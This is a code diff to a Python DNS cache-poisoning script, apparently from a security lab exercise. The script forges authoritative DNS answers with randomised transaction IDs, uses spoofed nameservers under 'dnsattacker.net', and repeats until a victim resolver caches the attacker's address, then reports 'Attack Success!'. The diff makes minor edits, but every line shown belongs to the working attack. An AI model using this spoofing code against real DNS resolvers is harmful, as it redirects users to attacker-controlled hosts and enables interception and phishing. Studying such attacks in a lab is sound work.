@@ -2,7 +2,7 @@
 import argparse
 import socket
 
-from scapy.all import DNS, DNSQR, DNSRR, IP, UDP
+from scapy.all import DNS, DNSQR, DNSRR
 from random import randint, choice
 from string import ascii_lowercase, digits
 
@@ -11,7 +11,7 @@ SPROOF_NS_1 = "ns1.dnsattacker.net"
 SPROOF_NS_2 = "ns2.dnsattacker.net"
 
 DNS_HOSTS = {
-    b"example.com.": "5.6.6.8",
+    b"example.com.": SPROOF_ADDR,
 }
 
 parser = argparse.ArgumentParser()
@@ -64,7 +64,7 @@ def exampleSendDNSQuery():
 
 def spoofDNS():
     dns_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    print("Sub Domain", SUB_DOMAIN)
+    # print("Sub Domain", SUB_DOMAIN)
     Qdsec = DNSQR(qname=SUB_DOMAIN)
     Anssec = DNSRR(rrname=SUB_DOMAIN, type='A', rdata=SPROOF_ADDR, ttl=68900)
     dns = DNS(id=getRandomTXID(), aa=1, rd=0, qr=1,
@@ -79,6 +79,7 @@ def spoofDNS():
 		# Set random TXID from 0 to 255
         response.getlayer(DNS).id = getRandomTXID()
         sendPacket(dns_sock, response, DNS_ADDR, my_query_port)
+    dns_sock.close()
 
 if __name__ == '__main__':
     while True:
@@ -89,4 +90,5 @@ if __name__ == '__main__':
         resp = DNS(data)
         if resp[DNS].an and resp[DNS].an.rdata == SPROOF_ADDR:
             print("Attack Success!")
+            sock.close()
             break
